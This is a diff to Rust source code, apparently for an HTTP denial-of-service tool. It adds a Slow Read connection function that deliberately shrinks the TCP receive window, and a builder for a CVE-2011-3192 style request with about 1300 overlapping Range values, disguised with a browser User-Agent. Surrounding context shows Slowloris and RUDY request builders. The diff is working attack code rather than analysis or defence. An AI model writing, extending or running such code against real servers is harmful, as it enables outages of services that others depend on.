@@ -11,7 +11,7 @@ use std::sync::Arc;
 use std::task::{Context as TaskContext, Poll};
 use std::time::Duration;
 use tokio::io::{AsyncRead, AsyncWrite, ReadBuf};
-use tokio::net::TcpStream;
+use tokio::net::{TcpSocket, TcpStream};
 use tokio_rustls::client::TlsStream;
 use tokio_rustls::rustls::pki_types::ServerName;
 use tokio_rustls::rustls::{ClientConfig, RootCertStore};
@@ -69,6 +69,33 @@ impl Target {
             connector: build_connector(&[]),
             h2_connector: build_connector(&[b"h2".to_vec()]),
         })
+    }
+
+    /// Open a connection with a deliberately small OS receive buffer, so our
+    /// advertised TCP window is tiny — the mechanism behind the Slow Read
+    /// vector (server can't flush its response, holds the connection open).
+    pub async fn connect_small_window(&self, rcvbuf: u32) -> Result<Conn> {
+        let socket = if self.addr.is_ipv4() {
+            TcpSocket::new_v4()?
+        } else {
+            TcpSocket::new_v6()?
+        };
+        socket.set_recv_buffer_size(rcvbuf).ok();
+        let tcp = tokio::time::timeout(CONNECT_TIMEOUT, socket.connect(self.addr))
+            .await
+            .context("connect timed out")??;
+        tcp.set_nodelay(true).ok();
+        if self.tls {
+            let stream = tokio::time::timeout(
+                CONNECT_TIMEOUT,
+                self.connector.connect(self.server_name.clone(), tcp),
+            )
+            .await
+            .context("TLS handshake timed out")??;
+            Ok(Conn::Tls(Box::new(stream)))
+        } else {
+            Ok(Conn::Plain(tcp))
+        }
     }
 
     /// Open one TLS connection with ALPN `h2` negotiated, returning the raw
@@ -230,6 +257,28 @@ pub fn build_slowloris_head(host: &str, path: &str) -> Arc<[u8]> {
          Accept: text/html,*/*;q=0.8\r\n"
     );
     head.into_bytes().into()
+}
+
+/// Pre-build a single request carrying a CVE-2011-3192 style Range header with
+/// ~1300 overlapping byte ranges, forcing the server into costly multipart
+/// response assembly. Returned in the same template shape as the GET builder.
+pub fn build_range_templates(host: &str, path: &str) -> Arc<[Box<[u8]>]> {
+    let mut ranges = String::with_capacity(12 * 1024);
+    ranges.push_str("bytes=0-");
+    for i in 0..1300 {
+        ranges.push_str(&format!(",{i}-{}", i + 1));
+    }
+    let req = format!(
+        "GET {path} HTTP/1.1\r\n\
+         Host: {host}\r\n\
+         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36\r\n\
+         Accept: */*\r\n\
+         Range: {ranges}\r\n\
+         Accept-Encoding: gzip\r\n\
+         Connection: keep-alive\r\n\r\n"
+    );
+    let templates: Vec<Box<[u8]>> = vec![req.into_bytes().into_boxed_slice()];
+    templates.into()
 }
 
 /// Pre-build the RUDY POST head: complete headers declaring a large body we
